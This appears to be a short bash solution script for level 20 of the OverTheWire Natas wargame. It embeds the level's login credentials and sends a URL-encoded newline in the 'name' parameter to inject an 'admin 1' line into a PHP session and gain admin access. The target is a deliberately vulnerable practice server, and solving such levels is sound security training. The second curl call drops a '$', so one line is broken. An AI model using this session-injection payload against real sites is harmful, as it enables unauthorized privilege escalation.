
natas20_(){
	user_pass="natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
	url="http://natas20.natas.labs.overthewire.org"
	my_cookie="PHPSESSID=ihatethisone"

	_=$(curl -isu $user_pass $url?name=admin%0Aadmin%201 --cookie "$my_cookie")

	val=$(curl -isu user_pass $url --cookie "$my_cookie")

	echo "$val"
}

# TODO:GREP